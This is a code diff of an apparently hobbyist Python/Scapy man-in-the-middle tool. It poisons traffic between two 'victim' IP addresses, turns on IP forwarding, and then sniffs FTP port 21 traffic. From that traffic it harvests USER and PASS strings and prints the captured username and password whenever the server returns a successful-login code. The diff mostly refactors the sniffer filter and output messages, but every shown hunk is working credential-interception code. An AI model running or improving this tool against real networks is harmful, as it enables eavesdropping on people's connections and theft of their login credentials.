@@ -58,8 +58,8 @@ def checkLogin(packet, user, password):
     try:
 
         if "230" in packet[Raw].load.decode('ascii'): #230 it's the code for a valid login 
-            print ("Valid Credentials Found... ")
-            print ("\n" + str(packet[IP].dst).strip() + " -> " + str(packet[IP].src).strip() + ":")
+            print ("\nFound successful login! : ")
+            print ("\n" + str(packet[IP].dst).strip() + " sent to " + str(packet[IP].src).strip() + ":")
             print ("Username: " + user+"\n")
             print ("Password: " + password + "\n")
             return
@@ -68,36 +68,23 @@ def checkLogin(packet, user, password):
     except Exception:
         return  
 
-#maybe this function can be done via sniff filter, check that later
-def checkIfFTPPacket(packet):
-
-    if packet.haslayer(TCP) and packet.haslayer(Raw): #haslayer returns true if said cls layer is on the packet  
-        if packet[TCP].sport==21 or packet[TCP].dport==21: #FTP connection to server is done via port 21 (not 20!!! thats for data)
-            return True
-        else:
-            return False
-    else:
-        return False
 
 def checkPacket(packet):
 
-    if checkIfFTPPacket(packet):
-        pass #aka continue
-    else: 
-        return #if not a FTP packet, return
+    if(packet.haslayer(Raw)):
+
+        data=packet[Raw].load
+        data=data.decode('ascii')
     
-    data=packet[Raw].load
-    data=data.decode('ascii')
-    
-    if "USER " in data:
-        #print("found ftp user packet\n")
-        usersFTP.append(data.split("USER ")[1].strip())
-    elif "PASS " in data:
-        #print("found ftp pass packet\n")
-        passwordsFTP.append(data.split("PASS ")[1].strip())
-    else:
-        #print("found ftp check packet\n")
-        checkLogin(packet, usersFTP[-1], passwordsFTP[-1]) #checks if previously user and pass stored is a valid login
+        if "USER " in data:
+            #print("found ftp user packet\n")
+            usersFTP.append(data.split("USER ")[1].strip())
+        elif "PASS " in data:
+            #print("found ftp pass packet\n")
+            passwordsFTP.append(data.split("PASS ")[1].strip())
+        else:
+            #print("found ftp check packet\n")
+            checkLogin(packet, usersFTP[-1], passwordsFTP[-1]) #checks if previously user and pass stored is a valid login
     return
 
 
@@ -106,13 +93,14 @@ def FTPSniffer(interface, victim1Ip, victim2Ip):
     print("Starting FTP Sniffer...\n")
 
     try:
-        sniff(iface=interface, prn=checkPacket, store=0) #prn specifies the function to apply to a received packet and store=0 to discard them 
+        #ftp uses 21 port for connection and 20 for data
+        sniff(iface=interface, prn=checkPacket, store=0, filter="tcp src port 21 or tcp dst port 21") #prn specifies the function to apply to a received packet and store=0 to discard them 
     except KeyboardInterrupt:
         print("Failed to init FTP sniffing. Cleaning MESS\n")
         cleanMess(victim1Ip, victim2Ip,interface)
         sys.exit(1)
 
-    print("Stopped FTP Sniffer....\n")
+    print("\nStopped FTP Sniffer....\n")
     return
 
 def chooseAttack(interface, victim1Ip, victim2Ip):
@@ -121,7 +109,7 @@ def chooseAttack(interface, victim1Ip, victim2Ip):
 
 
     try:
-        typeOfAttack=input("Press 1 for FTP, 2 for SNMP and 3 for Telnet\n")
+        typeOfAttack=input("\nPress 1 for FTP, 2 for SNMP and 3 for Telnet\n")
         
         if(typeOfAttack=='1'):
             FTPSniffer(interface, victim1Ip, victim2Ip)
@@ -173,22 +161,21 @@ def MITM():
         print("\n\nStop typing random commands and gimme type of os")
         sys.exit(1)
 
-    print("Enabling ip forwarding...\n")
+    print("\nEnabling ip forwarding...\n")
 
     if(os_type=='0'): os.system("sudo sysctl -w net.inet.ip.forwarding=1")
     else: os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-    print(victim1Mac)
-    print(victim2Mac)
 
-    print("Doing the mess...\n")
+    print("\nDoing the mess...\n")
 
     doTheMess(victim_1ip, victim_2ip,victim1Mac, victim2Mac)
 
     chooseAttack(interface, victim_1ip, victim_2ip)
    
+  
     try:
-        input("Type control-c to escape\n")
+        input("\nType control-c to escape\n")
     except KeyboardInterrupt:
         cleanMess(victim_1ip, victim_2ip, interface)
         pass
